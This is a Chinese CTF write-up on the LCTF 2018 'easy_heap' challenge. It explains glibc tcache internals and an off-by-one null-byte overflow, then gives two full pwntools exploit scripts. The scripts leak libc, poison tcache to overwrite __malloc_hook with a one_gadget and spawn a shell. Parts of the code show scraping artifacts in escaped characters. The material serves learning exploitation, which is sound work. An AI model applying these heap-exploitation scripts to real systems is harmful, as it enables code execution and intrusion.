> 原文链接: https://www.anquanke.com//post/id/170852 


# tcache Attack：lctf2018 easy_heap


                                阅读量   
                                **195258**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">6</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t01ecc36a06cafbb3f5.jpg)](https://p3.ssl.qhimg.com/t01ecc36a06cafbb3f5.jpg)



## 本文摘要：
- tcache机制与特性、攻击手段
- off-by-one漏洞
- 两种典型内存泄露手段：深入分析几处源码


## 引言：

前段时间的lctf2018中，第一道pwn题打击很大，深感知识储备捉襟见肘，虽然逆向分析五分钟之内就迅速确定了off-by-one漏洞的存在，但是由于对堆块重用机制和libc2.26之后新增的tcache机制一无所知，导致此题最终留憾；而在赛后了解到这两个机制后进行的复现过程中，最深的感受就是，这年头不好好审libc源码是不行了，否则真的是阻碍重重！



## 前置知识：堆块重用机制与size字段对齐计算方式

参考文章：[https://www.freebuf.com/articles/system/91527.html](https://www.freebuf.com/articles/system/91527.html)

近期继续匍匐在堆漏洞的学习路途上，接触了unsorted bin attack、fastbin attack、off by one三个漏洞，不过最终还是在off by one的学习上晚了一步，导致lctf easy_heap没能攻克下来：主要原因就是因为对堆块重用机制和size字段对齐处理一无所知。这篇文章将进行简单介绍。

### 一、堆块重用机制

之前在chunk结构的学习中我们已经了解到，presize字段仅在前一个堆块是空闲时才有意义，也就是说，当前一个堆块是inuse态时，presize是可有可无的。考虑到这一点，libc采用了一种机制：当一个堆块是inuse态时，它会把下一个堆块的presize字段也作为自己的用户区，这样就可以节省内存空间，这种把presize字段在pre_chunk非空闲时用作pre_chunk的数据区的处理机制就是堆块重用。

然而，并不是所有情况下都会使用堆块重用！这也是今天要讲的要点：

我们知道，堆块分配时，它的大小要进行内存对齐，32位操作系统中，会以8字节进行对齐（即堆块的大小必须是8字节的整数倍），而64位操作系统中，会以16字节进行对齐（即堆块的大小必须是16字节的整数倍）。

而堆块重用只出现在如下情况：申请的内存大小在按照上述规则进行向大取整后，得到的应有大小比原大小大出的值大于等于对齐字节量的一半！

比如64位操作系统中，malloc(0x88)，向大取整后是0x90，比原来大出了8个字节，而64位下的对齐字节量是16字节，8字节大于等于16的一半，因此会进行堆块重用：0x88中的最后8字节会存在下一个chunk的presize字段位置。而如果是malloc(0x79)，向大取整后是0x80，比原来大出7个字节，小于16的一半，就不会发生堆块重用。

为什么呢？堆块重用的初衷就是节约内存，当符合上述重用条件时，用户申请的大小mod对齐字节量后多出的那块大小是小于等于presize字段长度（如64位下是8字节）的，因此多出的这块小尾巴就正好可以顺便放进presize字段存储，相比来说，如果不重用presize来存，而是继续按16字节对齐，将会产生较大的内存浪费；而当不符合重用条件时，多出来的小尾巴是大于presize长度的，presize就存不下了，而size字段人家自己还有用你又不能拿来占，因此就没法进行堆块重用了。

> 总结一下堆块重用条件：申请的内存大小在按照上述规则进行向大取整后，得到的应有大小比原大小大出的值&gt;=对齐字节量的一半（presize字段长度）.    =&gt;也即：申请的内存大小mod对齐字节量&lt;=对齐字节量的一半（presize字段长度）.

### 二、size字段对齐计算方式

本部分阐述chunk的size字段的值是怎么算出来的.

size字段的值 = 对齐补齐( size字段长度 + 用户申请的长度 )

我们分用户申请的堆块采用了重用和未采用重用两种情况来看：

1、未采用重用：

[![](https://ma9p13.files.wordpress.com/2018/11/time688aae59bbe20181119230650.jpg)](https://ma9p13.files.wordpress.com/2018/11/time688aae59bbe20181119230650.jpg)

如上图，每格代表32位下的4字节或64位下的8字节，按计算公式进行对齐补齐后，共应占4个格，4个格子的长度即为size的值.

2、采用重用：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ma9p13.files.wordpress.com/2018/11/time688aae59bbe20181119231255.jpg)

如上图，每格代表32位下的4字节或64位下的8字节，按计算公式进行对齐补齐后，共应占4个格，4个格子的长度即为size的值.

我们发现：当采用了重用时，计算出来的size字段的值是舍弃了“小尾巴”的，即重用的presize字段长度并未算进来！

也就是说，无论是否重用，抽象掉计算过程来看，最终得到的size字段值一定是从chunk_head到next_chunk_head间的长度！

### 三、漏洞挖掘中的应用

1、off by one 可以覆盖inuse位：必须在进行了重用的情况下才能实现！

2、泄露堆地址时，加减的偏移量应取多少，需要考虑是否有重用！



## 题目分析：

（原题使用的libc版本为libc2.27，而本文的所有分析和使用的exp都是以libc2.26版本进行的，两者除了一些地址偏移量不同以外，其他方面完全一致，请读者自行注意，如果要用libc2.27调exp，只需把我们exp中的几个偏移改动一下就可以了！）

### 一、逆向分析与漏洞挖掘

现在应该养成好习惯了，逆的时候应该先看libc版本！

[![](https://ma9p13.files.wordpress.com/2018/12/1.jpg)](https://ma9p13.files.wordpress.com/2018/12/1.jpg)

libc2.27，引入了tcache新特性

> tcache：Thread Local Caching，线程本地缓存
故名思意，是个缓存，与其线程对应；说到缓存，应该想到“优先存取”的特点，事实上也确实如此
它也是个堆表，而且是单链表，其特点和fastbin基本相同，只是更弱，弱爆了，没有首块double free检查也没有size校验，爽歪歪
tcache特殊的一点是，它的fd指针是指向用户区的，而不是块首，这是和其他bin的一个重要区别
此外这个东西有一个奇葩的地方，人家别的堆表都待在arena里，但是tcache却存储在堆区；tcache的位置位于堆区的起始处，一共有64个链表，这64个链表的索引结点（也就是链首结点用于存放链表中第一个堆块地址的结点）依次存放在堆区起始处；每个链表最多维护7个堆块

#### 0x01:我们来看一下tcache的相关源码：

1.在 tcache 中新增了两个结构体，分别是 tcache_entry 和 tcache_pertheread_struct

```
/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */
typedef struct tcache_entry
`{`
  struct tcache_entry *next;
`}` tcache_entry;

/* There is one of these for each thread, which contains the per-thread cache (hence "tcache_perthread_struct").  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */
typedef struct tcache_perthread_struct
`{`
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
`}` tcache_perthread_struct;

static __thread tcache_perthread_struct *tcache = NULL;
```

可以看到，链表结点结构体很简单，就是一个next指针指向链表中下一个堆块（的用户数据区）；然后定义了一个线程的完整tcache结构体，由两部分组成，第一部分是计数表，记录了64个tcache链表中每个链表内已有的堆块个数（0-7），第二部分是入口表，用来记录64个tcache链表中每条链表的入口地址（即链表中第一个堆块的用户区地址）；最后一行则是初始化了一个线程的tcache，存储在堆空间起始处的tcache在这一步后就完成了分配，由于tcache本身也在堆区故也是一个大chunk，因此其大小是size_chunkhead + size_counts + size_entries = 16 + 64 + 64*8 = 592 = 0x250

因此在libc2.26及以后的版本中，堆空间起始部分都会有一块先于用户申请分配的堆空间，大小为0x250，这就是tcache（0x000-0x24F），也就是说用户申请第一块堆内存的起始地址的最低位字节是0x50

2.其中有两个重要的函数， tcache_get() 和 tcache_put():

```
static void
tcache_put (mchunkptr chunk, size_t tc_idx)
`{`
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx &lt; TCACHE_MAX_BINS);
  e-&gt;next = tcache-&gt;entries[tc_idx];
  tcache-&gt;entries[tc_idx] = e;
  ++(tcache-&gt;counts[tc_idx]);
`}`

static void *
tcache_get (size_t tc_idx)
`{`
  tcache_entry *e = tcache-&gt;entries[tc_idx];
  assert (tc_idx &lt; TCACHE_MAX_BINS);
  assert (tcache-&gt;entries[tc_idx] &gt; 0);
  tcache-&gt;entries[tc_idx] = e-&gt;next;
  --(tcache-&gt;counts[tc_idx]);
  return (void *) e;
`}`
```

这两个函数的会在函数 [_int_free](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l4173) 和 [__libc_malloc](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3051) 的开头被调用，其中 tcache_put 当所请求的分配大小不大于0x408并且当给定大小的 tcache bin 未满时调用。一个 tcache bin 中的最大块数mp_.tcache_count是7。free进去和分配出来就是用的put和get，可以看到并没有什么安全检查

小结：单链表LIFO头插、tcache存储在堆区、64个bins、每个bins最多放7个chunk、tcache的next指针指向chunk的用户数据区而不是chunk_head @tcache特性

#### 0x02:逆向分析寻找漏洞：

丢IDA看F5（笔者已对大部分函数重命名）：

[![](https://ma9p13.files.wordpress.com/2018/12/2.jpg)](https://ma9p13.files.wordpress.com/2018/12/2.jpg)

只有set_log、delet_log、print_log三个功能，显然新建记录和对记录的编辑应该是捏在一起了，因为没有单独的编辑功能，所以应该是新建即确定内容，我们先来看看set_log：

[![](https://ma9p13.files.wordpress.com/2018/12/3.jpg)](https://ma9p13.files.wordpress.com/2018/12/3.jpg)

可以看到，程序最多允许用户维护十条记录，索引表的每个表项只存一个记录指针和记录的大小，指针为空就是没记录，不为空就是有内容，还是非常的简洁的；分配用的函数是malloc，大小固定为0xF8，然后让用户输入要输入内容的长度，不得长于0xF8，然后就到了输入内容的部分了，输入内容单独用一个函数read_content来实现，传入的参数是写入目标地址和用户输入的size，我们跟进这个函数看看：

[![](https://ma9p13.files.wordpress.com/2018/12/4.jpg)](https://ma9p13.files.wordpress.com/2018/12/4.jpg)

a2就是用户输入的内容长度，是0的话就直接向目标内存写一个0x00

a2不为零时，循环一个字节一个字节读，如果没有触发0x00或n触发截断的话，循环条件就是判断a2-1&lt;v3，按理说v3作为下标应该是从0读到a2-1，但是read函数是在if之前执行的，也就是说，当v3递增至v3 = a2 – 1后，经过一次++v3后v3就等于a2了，已经溢出了，但是下一轮循环在if之前已然read给了a1[v3]即a1[a2]，溢出了一个字节，也就是说只要用户输入长度为0xf8，最终对应的堆块就一定会被溢出一个字节踩到下一个堆块的开头

注意往下两行a1[v3] = 0和a1[a2] = 0，v3代表的是读入的最终停止位置，a2代表的是用户输入的长度，但是显然这里的处理是错误的，应该是a1[a2-1]=0，也就是说，如果用户输入的长度是0xf8，即使用户提前用0x00或n停止了输入，依然会溢出一个字节0x00踩到下个堆块

综上，用户可以通过输入长度0xf8，来溢出一个字节踩到下个堆块，但是存在限制，通过溢出写入字节只能是0x00；这就是典型的由于缓冲区边界检查逻辑考虑不周导致的OFF BY ONE漏洞。

再来看一下delet_log：

[![](https://ma9p13.files.wordpress.com/2018/12/5.jpg)](https://ma9p13.files.wordpress.com/2018/12/5.jpg)

该置零的都置零了，没有漏洞，给个赞

最后看看print_log，这是我们泄露内存的唯一依据：

[![](https://ma9p13.files.wordpress.com/2018/12/6.jpg)](https://ma9p13.files.wordpress.com/2018/12/6.jpg)

做了存在性检查，又由于delet_log是安全的，故这里没有利用点；此外打印用的是puts，遇到0x00和n会截断，泄露内存时注意一下即可

小结：存在off by one漏洞，通过在输入长度时输入0xf8触发

### 二、漏洞利用分析

现在已经能够确定：存在off by one，但是溢出只能写入0x00

那么到底踩到了下一个堆块的哪一部分呢？chunk的头部依次是pre_size和size字段，故踩到的是pre_size的最低字节…..

[![](https://ma9p13.files.wordpress.com/2018/10/1412702-20180611202524971-337638128.png)](https://ma9p13.files.wordpress.com/2018/10/1412702-20180611202524971-337638128.png)

还没反应过来的读者请学习笔者之前的文章《堆块重用机制与size字段对齐计算方式》

malloc申请的大小是0xf8，满足堆块重用条件，故发生了堆块重用，因此溢出的那个字节踩到的是下一个chunk的size字段的最低字节，被篡改成了00.

size字段原本应该是0x101（不知道怎么算出来的仍旧参考堆块重用那篇文章），所以我们实际上是将0x01改写成了0x00，在没有破坏到原有大小值的情况下将pre_inuse位覆盖成了0，成功伪造了pre_chunk为free态的假象，进一步可以触发合并

当然，我们的最终目的是劫持函数指针（此次仍是揍malloc_hook），方法我们还是打算用经典的double link法，尝试构造两个用户指针索引同一个chunk，然后free一个，再通过另一个篡改next指针劫持到malloc_hook，然后分配到malloc_hook再篡改一下劫持到onegadget就行了

然后我们需要泄露到libc的地址来定位malloc_hook和onegadget

这样一来，现在的情况是：可以off by one触发合并、需要泄露libc、需要tcache attack劫持控制流

#### 目的明确，我们现在先思考如何泄露libc

之前笔者的文章中总结过泄露内存有两种典型思路：堆扩张和重索引

tcache在堆区，其中的数据都对泄露libc没啥帮助，只能泄露堆区地址，我们应该想办法能构造出unsorted bin chunk才能进一步尝试泄露libc地址。怎么进unsorted bin chunk呢？在引入tcache机制后，在申请的大小符合规定时，只要tcache里面还有符合要求的，就先从tcache里面出，在free掉一个堆块后，只要与其大小对应的tcache链表还没满（不足7个），就一定先进tcache @tcache特性；因此想要free一个chunk进unsorted bin，必须先free掉7个相同大小的chunk把tcache填满，才能把它弄进unsorted bin，同样，你要把它再拿出来，也要先malloc 7次把tcache清空了才能拿到unsorted bin里的。

此外，我们需要了解tcache转移机制：当用户申请一个堆块的时候，如果tcache已经为空，而fastbin/smallbin/unsorted bin中有size符合的chunk时，会先把fastbin/smallbin/unsorted bin中的chunk全部转移到tcache中直到填满，然后再从tcache中拿（这就很符合缓存的特性）；转移的过程其实就是前者的常规拆卸操作和后者的常规链入操作。@tcache特性

注意：经调试证实，unsorted bin合并时，合并后的堆块不会进tcache，在从一个大的unsorted bin chunk分割出chunk的情形下，分出来的和剩下的都不会进tcache！ @tcache特性

也就是说，如果你想从unsorted bin里拿到一个chunk，如果你认为连续malloc 7次清空了tcache后，再malloc一个就是直接把unsorted bin链尾的那个chunk拿出来就ok了，那就大错特错了！unsorted bin里的chunk这时候必须要全部都转移进tcache，然后再从tcache里往外拿！（注意unsorted bin是FIFO，tcache是LIFO）

了解了以上几个特性，我们可以正式开始考虑，如何利用off by one带来的非法堆块合并来泄露内存了：

首先我们应该对堆块合并可能带来的利用面熟悉于心：一旦通过伪造preinuse导致合并后，将会获得一个用户指针指向一个已经“被free”了的（在bin中的）堆块，显然这个堆块既然由于被非法合并进了bin，就可以再次被分配到，当它再次被分配到的时候就有两个用户指针指向它了，这就成功地打出了双重索引；此外，被合并的堆块既然进了bin的同时又有着一个用户指针的索引，那么显然可以通过这个用户指针进行读操作泄露fd和bk；另外，如果有理想的溢出条件，则可以隔块合并实现堆扩张来攻击中间的那个堆块，这种手段的好处是最前面的那个堆块可以提前free掉，就天然形成合法的fd和bk了，避免了困难的构造。

非常好，看来可以一举两得了，泄露fd和bk可以让我们拿到libc地址，而同时有可以构造出双重索引来进行下一步的tcache attack劫持。下面我们来看如何来完成这个伟大的合并：

第一点肯定是要过unlink的“自闭”检查了（检查fd的bk和bk的fd是不是自己，也就是自闭症检查，不管堆块有没有，反正我有，我是真的自闭了），你要合并成功，就得让堆块自闭，不然你就得自闭…我说的是不是很有道理…也就是说fd和bk的值必须得满足检查才行。

*注：此外在libc2.26中，被unlink堆块的size还要和被free堆块的presize对上才行，某些时候就需要伪造，详见之后的文章《libc版本差异：unlink检查》

这也是难点所在，我们可爱又可恨的set_log函数给了我们off by one，却也给了我们字符截断，这样我们如果想通过先free再分配再读的思路泄露内存，再分配的时候由于截断的机制你永远别想达成目的，就只能借助堆块合并带来的攻击面来泄露，但仍不轻松：

我要在相邻堆块间触发unlink，就有一个问题，既然被unlink的堆块被一个用户指针索引着，那也就是说，被unlink的堆块已经被分配到了，也就是说不考虑UAF的情况（因为本例中未出现UAF漏洞），那么这个堆块是通过合法途径分配到的，考虑合法的分配途径，比如从top chunk出、从unsorted bin出、从small bin出、从fastbin出，都过不了自闭检查，那么要过自闭检查的话无非就两种思路了：第一是能通过某种办法使得被unlink堆块的fd和bk能过自闭检查，第二是隔块合并利用天然fd和bk过检。

第二种思路笔者很喜欢，因为隔块合并大法经常会阴差阳错地天然绕过libc2.26的__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)检查，而不用刻意构造size合法

第一种思路可以作为tcache类pwn的一个通用技巧来介绍：基于之前介绍的特性，当用户申请chunk时若tcache已空、unsorted bin还有，那unsorted bin里的所有chunk会先全部转移进tcache再从tcache中一个个出，又由于unsorted bin和tcache分别是FIFO和LIFO，读者自己推演一下这个过程不难发现，转移前后各chunk的bk是不会改变的，而fd的最低字节会由0x00变成0x10（tcache的fd指向chunk数据区）其他字节和原来一模一样！而在此题中，源码的写入逻辑决定了可以把这个0x10写成0x00，这样一来转移前后这几个chunk的fd和bk都和原来在unsorted bin中时一样，保护了合法关系，为进一步堆块合并攻击做好了铺垫！

### 三、EXPLOIT

这两种思路具体怎么实施呢？下面分别给出作者根据第一种和第二种思路开发的exp：

EXP1：利用u2t转移

```
from pwn import *
#ARCH SETTING
context(arch = 'amd64' , os = 'linux')
r = process('./easy_heap')
#r = remote('127.0.0.1',9999)
```



```
#FUNCTION DEFINE
def new(size,content):
r.recvuntil("?n&gt; ")
r.sendline("1")
r.recvuntil("size n&gt; ")
r.sendline(str(size))
r.recvuntil("content n&gt; ")
r.send(content)

def newz():
r.recvuntil("?n&gt; ")
r.sendline("1")
r.recvuntil("size n&gt; ")
r.sendline(str(0))

def delet(idx):
r.recvuntil("?n&gt; ")
r.sendline("2")
r.recvuntil("index n&gt; ")
r.sendline(str(idx))

def echo(idx):
r.recvuntil("?n&gt; ")
r.sendline("3")
r.recvuntil("index n&gt; ")
r.sendline(str(idx))

#MAIN EXPLOIT

#memory leak
for i in range(10):
newz()
#choose chunk0 2 4 into unsorted bin
delet(1)
delet(3)
for i in range(5,10):
delet(i)
#now tcache filled ,waiting queue is idx.1 , 3 , 5~10
#make unsorted bin: ustbin -&gt; 4 -&gt; 2 -&gt; 0 ,then chunk2 will be leak_target_chunk
delet(0)
delet(2)
delet(4)
#waiting queue is idx.0~10chunk9~5 , 3 , 1 ,and now all chunks was freed ,heap was null
#clean tcache
for i in range(7):
newz() #chunk3 is idx.5 (987653:012345)
#unsorted_bin trans to tcache
newz() #idx.7:pushing 0x00 on the lowest byte will hijack leak_target_chunk.BK's fd bingo on target!
new(0xf8,'x00') #idx.8:1.off-by-one the preinuse bit of chunk3 2.hijack the lowest byte of leak_target_chunk correctly to FD
#fill tcache but don't touch idx.7 , 8 , 5 (six enough considering chunk0 remained in tcache)
for i in range(5):
delet(i)
delet(6)
#merge &amp; leak
delet(5)
echo(8)
unsorted_bin = u64(r.recv(6).ljust(8,'x00'))
libc_base = unsorted_bin - 0x3dac78
print(hex(libc_base))
malloc_hook = libc_base + 0x3dac10
onegadget = libc_base + 0xfdb8e #0x47ca1 #0x7838e #0x47c9a #0xfccde

#hijack
#clean tcache
for i in range(7):
newz()
newz() #idx.9
#now we hold idx.8&amp;9 pointing chunk2
delet(0) #passby counts check
delet(8)
delet(9)
new(0x10,p64(malloc_hook))
newz()
new(0x10,p64(onegadget))

#fire
#according to the logic that size is inputed after malloc
delet(1) #passby idxtable full check
#x = input("fucking")
r.recvuntil("?n&gt; ")
r.sendline("1")
r.interactive()
```

-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·

EXP2：利用隔块合并攻击

```
from pwn import *
#ARCH SETTING
context(arch = 'amd64' , os = 'linux')
r = process('./easy_heap')
#r = remote('127.0.0.1',9999)
```



```
#FUNCTION DEFINE
def new(size,content):
r.recvuntil("?n&gt; ")
r.sendline("1")
r.recvuntil("size n&gt; ")
r.sendline(str(size))
r.recvuntil("content n&gt; ")
r.send(content)

def newz():
r.recvuntil("?n&gt; ")
r.sendline("1")
r.recvuntil("size n&gt; ")
r.sendline(str(0))

def delet(idx):
r.recvuntil("?n&gt; ")
r.sendline("2")
r.recvuntil("index n&gt; ")
r.sendline(str(idx))

def echo(idx):
r.recvuntil("?n&gt; ")
r.sendline("3")
r.recvuntil("index n&gt; ")
r.sendline(str(idx))

#MAIN EXPLOIT

#memory leak
#prepare for EG attack ,we will build a chunk with presize 0x200
for i in range(10):
newz()
#fill tcache
for i in range(3,10):
delet(i)
#chunk0 1 merge to ustbin, and the chunk2.presize will be 0x200
delet(0)
delet(1)
delet(2) #to make presize stable;maybe only link change both presize and sizeinuse, unlink only change inuse
#x = input("debug")
#then our target is cross-merge
#for cross-merge we must make sure that chunk0 is freed for bypass
#clean tcache
for i in range(7):
newz() #idx.0~7
#x = input("debug33")
newz() #idx.7 chunk0
#x = input("debug33")
newz() #idx.8 chunk1
#x = input("debug33")
newz() #idx.9 chunk2
#x = input("debugggg")
#fill tcache
for i in range(0,7):
delet(i)
#chunk0 into unsorted bin to correct fd &amp; bk for bypass unlink check
delet(7)
#out a chunk from tcache to give a space for chunk1 in-out ,in order to prevent merging again
newz() #idx.0
delet(8)
new(0xf8,'x00') #idx.1 ,we hold it
delet(0) #give back idx.0 to refill tcache
delet(9) #fire
#x = input("debug0")
#clean tcache
for i in range(7):
newz() #idx:0 , 2~7
newz() #idx.8 to cut chunk0, now chunk1.fd &amp; bk point unsorted bin merging with chunk2
#x = input("debug")
echo(1)
unsorted_bin = u64(r.recv(6).ljust(8,'x00'))
libc_base = unsorted_bin - 0x3dac78
print(hex(libc_base))
malloc_hook = libc_base + 0x3dac10
onegadget = libc_base + 0xfdb8e #0x47ca1 #0x7838e #0x47c9a #0xfccde
#x = input("pause")

#hijack
newz() #idx.9
#now we hold idx.1&amp;9 pointing chunk1
delet(0) #passby counts check
delet(1)
delet(9)
new(0x10,p64(malloc_hook))
newz()
new(0x10,p64(onegadget))

#fire
#according to the logic that size is inputed after malloc
delet(2) #passby idxtable full check
#x = input("fucking")
r.recvuntil("?n&gt; ")
r.sendline("1")
r.interactive()
```

-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·

### 四、exp详解

1.细节问题：就是该题的索引表存储上限只有10个，exp执行过程中要时刻注意是否满了，以保证能通过索引表填满的检查

2.exp1个人感觉没啥大问题，读者自己读一下exp代码、注释，跟着调一下问题应该不大

3.exp2读者如果有问题的话，我猜应该是和size、presize、preinuse这三个关键字段是在何时设置有关，因为这直接影响到能否通过诸多检查，我们在下面“特性补充”部分单独说

### 五、特性补充

#### 一、

1.preinuse位何时置零：仅在前块link入unsorted bin过程中置零

2.size字段何时设置：仅在①alloc过程中设置 ②合并过程中合并后link入unsorted bin前设置

*3.presize字段何时设置：仅在前块link入unsorted bin过程中设置

4.单独的unlink动作不对后块preinuse位置1

5.堆块合并过程：先unlink前块，再合并，再link入unsorted bin

6.堆块合并过程中，指针变化和合并后的size计算是以用户free的那个块为中心，而前面提到的size==next.presize检查则是以被合并的前块为中心：堆块指针在合并后直接用presize值前推偏移，新size也是用户free块的size直接加上presize，而新增检查则是以前块为中心的

#### 二、因此，我们的exp2实现隔块合并攻击的思路就是：

1.制造仨chunk全都free合并入unsorted bin：这时chunk3的presize为2*chunk

2.再把它们分配出来

3.chunk1给free进unsorted bin：①隔块合并它的时候能天然绕过bk、fd那个检查 ②chunk2的presize为1*chunk

4.chunk2先free进tcache，再分配到它off by one：①代码逻辑决定只能在分配的时候写那么一次而没有单独的编辑函数 ②进tcache要先new出一个腾地方，不能进unsorted bin是为了防止和chunk1合并破坏之前的铺垫

5.free掉chunk3即可隔块合并到chunk1：chunk3的presize是2*chunk找到chunk1了，chunk1做size检查找到chunk2的presize是1*chunk绕过成功，fd、bk那个检查也是天然过的

### 六、思考与总结

其实堆的利用有点像华容道、推箱子这种游戏，倒来倒去的，所以建议大家多玩这种游戏（突然智障233333）

libc的源码还是要审的，强烈建议各位一定抽时间一天看一点，把libc源码争取能全部看完

最后留一个挑战：读者认为该题进行隔块合并攻击时，开始只需要俩chunk进unsorted bin就可以了，chunk3开始是没必要delet的，你觉得是不是更简洁呢？不妨按这个思路自行写写exp看，笔者还没有这样写过，写好会在下一篇文章补充发上来哦~
